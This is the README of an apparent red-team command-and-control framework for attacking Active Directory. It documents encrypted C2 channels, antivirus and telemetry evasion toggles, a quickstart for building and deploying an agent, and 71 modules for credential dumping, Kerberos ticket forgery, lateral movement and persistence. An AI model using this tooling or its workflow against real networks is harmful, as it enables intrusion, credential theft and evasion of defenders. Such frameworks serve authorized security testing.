<p align="center">
  <img src="docs/assets/banner.png" alt="Calabasas C2" width="700">
</p>

<h1 align="center">Calabasas C2</h1>

<p align="center">
  <b>Modular Active Directory Post-Exploitation Framework</b><br>
  <i>No processes spawned. No commands executed. Pure API.</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.10+-blue?logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/agent-C%2FWin32-orange?logo=c&logoColor=white" alt="C Agent">
  <img src="https://img.shields.io/badge/.NET_Framework-4.0+-purple?logo=dotnet&logoColor=white" alt=".NET">
  <img src="https://img.shields.io/badge/modules-71-green" alt="Modules">
  <img src="https://img.shields.io/badge/license-proprietary-red" alt="License">
</p>

<p align="center">
  <a href="docs/USAGE.md">Usage Guide</a> &bull;
  <a href="docs/TESTING_CHECKLIST.md">Testing Checklist</a> &bull;
  <a href="#quickstart">Quickstart</a> &bull;
  <a href="#modules">Modules</a> &bull;
  <a href="#architecture">Architecture</a>
</p>

---

## Philosophy

Calabasas is built on three principles borrowed from [Kraken](https://github.com/kraken-ng/Kraken):

**1. No command execution.** Every capability — from listing files to performing DCSync — is implemented through direct Win32 API calls via P/Invoke, in-process BOF execution, or in-memory .NET assembly loading. The agent **never** spawns `cmd.exe`, `powershell.exe`, or any child process unless the operator explicitly requests it.

**2. Retrocompatibility.** Every module declares which agent versions and .NET runtimes it supports. The operator client validates compatibility before dispatch. A BOF compiled for features in agent 2.0 will not be sent to a 1.0 agent.

**3. Modularity via separation.** The operator client (Python), the agent (C/.exe), and the modules (BOF/Assembly) are three independent codebases connected by a well-defined binary protocol. Adding a module means writing a `.c` file and a `module.yaml` manifest. Zero changes to the agent. Zero changes to the client.

---

## Architecture

```
┌─────────────────────┐         ┌──────────────────────────────────────────┐
│   OPERATOR CLIENT   │         │              TARGET NETWORK              │
│     (Python)        │         │                                          │
│                     │  HTTPS  │  ┌─────────┐    SMB Pipe   ┌─────────┐  │
│  ┌───────────────┐  │◄───────►│  │ Agent 1 │◄────────────►│ Agent 2 │  │
│  │  CLI Shell    │  │         │  │ (DC01)  │               │ (WS04)  │  │
│  │  Tab Complete │  │  DNS    │  └─────────┘               └─────────┘  │
│  │  Rich Output  │  │◄───────►│                                          │
│  └───────────────┘  │         │  ┌─────────┐                             │
│  ┌───────────────┐  │  TCP    │  │ Agent 3 │                             │
│  │  Listeners    │  │◄───────►│  │ (SRV02) │                             │
│  │  HTTPS/SMB/   │  │         │  └─────────┘                             │
│  │  DNS/TCP      │  │         │                                          │
│  └───────────────┘  │         └──────────────────────────────────────────┘
│  ┌───────────────┐  │
│  │ Module Engine │  │          Modules loaded at runtime:
│  │ Registry +    │  │          ┌─────┐  ┌──────────┐  ┌────────┐
│  │ Dispatcher    │  │          │ BOF │  │ Assembly │  │ Native │
│  └───────────────┘  │          │ .o  │  │ .exe     │  │ Win32  │
└─────────────────────┘          └─────┘  └──────────┘  └────────┘
```

| Component | Language | Description |
|-----------|----------|-------------|
| **Operator Client** | Python 3.10+ | Interactive shell, listener management, module dispatch, logging |
| **Agent** | C (Win32) | ~10,500 lines. 31 source files. Cross-compiled with MinGW-w64 |
| **Modules** | C (BOF) / C# (.NET) | 71 modules across 8 categories, loaded at runtime |
| **Protocol** | Binary TLV | AES-256-GCM encrypted, ECDH key exchange, malleable HTTP profiles |

---

## Features

### C2 Channels
- **HTTPS** — Primary channel with malleable profile support (mimic Google, Azure, Slack, etc.)
- **SMB Named Pipes** — Agent-to-agent chaining for internal pivoting
- **DNS** — Low-and-slow channel for restricted networks (TXT/CNAME/A record encoding)
- **Raw TCP** — Fastest channel with optional TLS, persistent socket with push capability
- **Automatic Fallback** — Configurable priority order with retry limits per channel

### Agent Capabilities
- **COFF Loader** — Full x64/x86 BOF execution with Beacon API compatibility (works with existing CS BOFs)
- **Assembly Loader** — In-memory `Assembly.Load` with stdout/stderr capture
- **Native Modules** — 12 built-in modules via direct Win32 API (file ops, process, network, registry, credentials, screenshot, SOCKS, portscan)
- **Token Management** — Impersonation, token theft, make token, revert

### Evasion (Build-Time Toggles)
| Feature | Description |
|---------|-------------|
| AMSI Patch | Patches `AmsiScanBuffer` → `AMSI_RESULT_CLEAN` |
| ETW Patch | Patches `EtwEventWrite` → suppresses .NET CLR telemetry |
| ntdll Unhook | Restores ntdll.dll `.text` section from clean disk copy |
| Sleep Obfuscation | Ekko-style: encrypt agent memory + set RW during sleep |
| PE Header Stomp | Zeros MZ/PE headers in memory after initialization |
| API Hashing | Resolves sensitive APIs via PEB walk + DJB2 hash |
| Stack Spoofing | Spoofs thread call stack during sleep |
| Indirect Syscalls | Hell's Gate syscall resolution |
| Anti-Debug | IsDebuggerPresent + NtQueryInformationProcess checks |
| Anti-Sandbox | VM/sandbox heuristics (CPU count, RAM, recent files, uptime) |
| Module Stomping | Payload loading via legitimate module hollowing |

### Operator Client
- **Interactive shell** with context-aware tab completion (module names, arguments, file paths)
- **Module registry** with auto-discovery, YAML manifests, OPSEC warnings, and version validation
- **Rich output** — formatted tables with column transforms (FILETIME → datetime, UAC bitmask → flags)
- **JSONL logging** — operator log, per-agent log, raw traffic log for forensic replay

---

<a id="quickstart"></a>
## Quickstart

### 1. Install dependencies

```bash
git clone <repo> && cd calabasas-c2
pip install -r requirements.txt
sudo apt install mingw-w64    # Cross-compiler for agent
```

### 2. Generate keys and certificates

```bash
python scripts/generate_keys.py

openssl req -x509 -newkey rsa:2048 -keyout certs/server.key \
    -out certs/server.pem -days 365 -nodes -subj "/CN=cdn.example.com"
```

### 3. Start the operator

```bash
python -m client.main \
    --listen-port 8443 \
    --cert certs/server.pem \
    --key certs/server.key \
    --rsa-key keys/server_priv.pem
```

### 4. Generate and deploy an agent

```
main> generate --url https://YOUR_IP:8443/api/v1 --sleep 10 --jitter 20
```

Transfer `builds/agent.exe` to the target and execute. Wait for check-in:

```
main> agents
  ID   Hostname   User              PID    Arch   Channel  Last
  1    DC01       CORP\admin         4728   x64    HTTPS    2s

main> interact 1
[agent 1][DC01][CORP\admin][HIGH][x64][PID:4728] />
```

### 5. Operate

```
[agent 1] /> whoami
[agent 1] /> ps
[agent 1] /> enumdomainusers
[agent 1] /> kerberoast
[agent 1] /> reg_secpolicy
[agent 1] /> cred_credman
[agent 1] /> portscan --targets 10.0.0.0/24 --ports 445,3389
```

---

<a id="modules"></a>
## Modules

71 modules across 8 categories. Each module is a self-contained directory with a `module.yaml` manifest.

### Enumeration (15)
| Module | Technique | API |
|--------|-----------|-----|
| `enumdomainusers` | LDAP user enumeration | wldap32 |
| `enumdomaingroups` | LDAP group enumeration | wldap32 |
| `enumdomaincomputers` | LDAP computer enumeration | wldap32 |
| `enumdomaintrusts` | Domain trust enumeration | netapi32 / LDAP |
| `enumgpos` | Group Policy object listing | LDAP |
| `enumacls` | DACL/ACE enumeration on AD objects | LDAP + advapi32 |
| `enumspns` | Service Principal Name discovery | LDAP |
| `enumasrep` | AS-REP roastable accounts | LDAP (UAC flag check) |
| `enumsessions` | Active logon sessions on remote host | netapi32 |
| `enumshares` | Network share enumeration | netapi32 |
| `enumlocalgroupmembers` | Local group membership | netapi32 / samr RPC |
| `finddomainadmins` | Recursive Domain Admins membership | LDAP (chain match) |
| `findlocaladmins` | Find hosts where current user is local admin | netapi32 |
| `ldapsearch` | Raw LDAP query with custom filter | wldap32 |
| `dnsquery` | DNS record lookup | dnsapi |

### Credentials (11)
| Module | Technique | API |
|--------|-----------|-----|
| `kerberoast` | TGS request for SPN accounts → offline crack | secur32 SSPI + wldap32 |
| `asreproast` | AS-REQ without pre-auth → offline crack | Raw Kerberos (port 88) |
| `dcsync` | Directory replication to extract hashes | DRSR RPC (MS-DRSR) |
| `dumplsass` | LSASS memory dump (in-memory, no disk) | dbghelp / NtReadVirtualMemory |
| `dumpsam` | SAM database extraction | Registry / VSS |
| `dumpvault` | Windows Vault credential dump | vaultcli |
| `dumpdpapi` | DPAPI master key + blob decryption | crypt32 |
| `extracttickets` | Kerberos ticket cache extraction | secur32 LSA |
| `ptt` | Pass-the-Ticket injection | secur32 LSA |
| `overpassthehash` | TGT from NTLM hash | secur32 / raw Kerberos |
| `shadowcredentials` | msDS-KeyCredentialLink abuse | LDAP write |

### Kerberos Tickets (17)
| Module | Technique |
|--------|-----------|
| `klist` | List cached tickets |
| `extracttickets` | Extract .kirbi blobs from cache |
| `ptt` | Inject ticket into logon session |
| `purgetickets` | Clear ticket cache |
| `tgtdeleg` | Extract TGT via delegation trick |
| `requesttgt` | Request TGT with password/hash/key |
| `requesttgs` | Request service ticket for SPN |
| `renewticket` | Renew expiring TGT |
| `s4u2self` | S4U2Self impersonation |
| `s4u2proxy` | S4U2Proxy constrained delegation |
| `forgegoldenticket` | Forge Golden Ticket (offline) |
| `forgesilverticket` | Forge Silver Ticket (offline) |
| `forgediamondticket` | Modify legitimate TGT's PAC |
| `forgesapphireticket` | Replace TGT PAC with S4U2Self PAC |
| `describeticket` | Parse and display .kirbi contents |
| `convertticket` | Convert between .kirbi and .ccache |
| `changepw` | Change/set user password via Kerberos |

### Lateral Movement (6)
| Module | Technique | Transport |
|--------|-----------|-----------|
| `wmiexec` | WMI Process.Create | DCOM/RPC |
| `smbexec` | Service creation + start | SCM over SMB |
| `psexec` | Upload binary + service install | SMB + SCM |
| `dcomexec` | MMC20/ShellWindows/ShellBrowserWindow | DCOM |
| `winrmexec` | WinRM command execution | HTTP/5985 |
| `scshell` | Modify existing service binPath | SCM (fileless) |

### Privilege Escalation (7)
| Module | Technique |
|--------|-----------|
| `getsystem` | Named pipe impersonation → SYSTEM |
| `tokenmanip` | Token theft / impersonation / duplication |
| `printspoofer` | SpoolSS named pipe impersonation |
| `abusecerttemplate` | ADCS ESC1–ESC8 exploitation |
| `addmachineaccount` | Add computer to domain (MAQ abuse) |
| `rbcd` | Resource-based constrained delegation |
| `samaccountname` | sAMAccountName spoofing (CVE-2021-42278) |

### Persistence (8)
| Module | Technique |
|--------|-----------|
| `goldenticket` | Forge persistent Golden Ticket |
| `silverticket` | Forge persistent Silver Ticket |
| `dcshadow` | Register rogue DC, push AD changes via replication |
| `addgroupmember` | Add user to privileged group |
| `setspn` | Set SPN on account for later Kerberoast |
| `skeleton` | Skeleton Key injection on DC |
| `dsrm` | DSRM password abuse |
| `scheduledtask` | Remote scheduled task creation |

### Evasion (6)
| Module | Technique |
|--------|-----------|
| `patchamsi` | Runtime AMSI bypass |
| `patchetw` | Runtime ETW bypass |
| `unhookntdll` | Restore ntdll from disk |
| `blockdlls` | Block non-Microsoft DLLs in child processes |
| `ppidspoof` | Parent PID spoofing |
| `timestomp` | File timestamp manipulation |

### Native (Built-in)
File ops (`ls`, `cat`, `cp`, `mv`, `rm`, `mkdir`, `upload`, `download`), process ops (`ps`, `kill`), network enum (`net_tcp`, `net_udp`, `net_arp`, `net_routes`, `net_dns`, `net_interfaces`), registry ops (`reg_query`, `reg_set`, `reg_delete`, `reg_autoruns`, `reg_creds`, `reg_software`, `reg_secpolicy`), credential harvesting (`cred_vault`, `cred_credman`, `cred_wifi`, `cred_rdp`, `cred_cloud`), `screenshot`, `portscan`, `socks_proxy`, `whoami`, `token_*`.

---

## Writing a New Module

```bash
python scripts/create_module.py --name mymodule --category enumeration --type bof
```

This scaffolds:

```
modules/enumeration/mymodule/
├── module.yaml          # Manifest (args, compat, OPSEC level, output format)
├── src/mymodule.c       # BOF source
└── bin/                 # Compiled .o files go here
```

Write your BOF using standard Beacon API conventions:

```c
#include "beacon_compat.h"

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetCurrentProcessId();

void go(char* args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "PID: %d\n", KERNEL32$GetCurrentProcessId());
}
```

Compile and use:

```bash
x86_64-w64-mingw32-gcc -c -Os -o bin/mymodule.x64.o src/mymodule.c
```

Restart the operator — the module auto-discovers on startup. Existing Cobalt Strike BOFs work out of the box.

---

## Project Structure

```
calabasas-c2/
├── client/                    # Python operator (4,400 LOC)
│   ├── cli/                   #   Interactive shell, tab completion, commands
│   ├── core/                  #   Session manager, task manager, module registry
│   ├── listeners/             #   HTTPS, SMB, DNS, TCP listeners
│   ├── crypto/                #   AES-GCM, ECDH, RSA, nonce management
│   ├── protocol/              #   TLV, packet framing, argument packing
│   ├── formatters/            #   Output rendering and column transforms
│   └── profiles/              #   Malleable C2 profile engine
├── agent_c/                   # C agent (10,500 LOC)
│   ├── include/               #   19 header files
│   ├── src/                   #   31 source files
│   └── Makefile               #   MinGW-w64 cross-compilation
├── modules/                   # 71 BOF + Assembly modules
│   ├── enumeration/           #   15 modules
│   ├── credentials/           #   11 modules
│   ├── tickets/               #   17 modules
│   ├── lateral_movement/      #   6 modules
│   ├── privesc/               #   7 modules
│   ├── persistence/           #   8 modules
│   └── evasion/               #   6 modules
├── profiles/                  # Malleable C2 profiles
├── scripts/                   # Build, keygen, module scaffold
├── docs/                      # Documentation
│   ├── USAGE.md               #   Exhaustive usage guide
│   └── TESTING_CHECKLIST.md   #   Pre-production test plan
└── requirements.txt
```

---

## Documentation

| Document | Description |
|----------|-------------|
| [Usage Guide](docs/USAGE.md) | Complete operational manual — setup, commands, modules, channels, OPSEC |
| [Testing Checklist](docs/TESTING_CHECKLIST.md) | 200+ test cases for pre-engagement validation |

---

## Requirements

**Operator machine:**
- Python 3.10+
- MinGW-w64 (`apt install mingw-w64`)
- Dependencies: `pip install -r requirements.txt`

**Target:**
- Windows 7 SP1 / Server 2008 R2 or later
- .NET Framework 4.0+ (default on all modern Windows)
- x64 or x86

---

## Legal

This framework is designed exclusively for **authorized** penetration testing, red team engagements, and security assessments conducted under explicit written permission. Unauthorized use against systems you do not own or have authorization to test is illegal and unethical. The developers assume no liability for misuse.
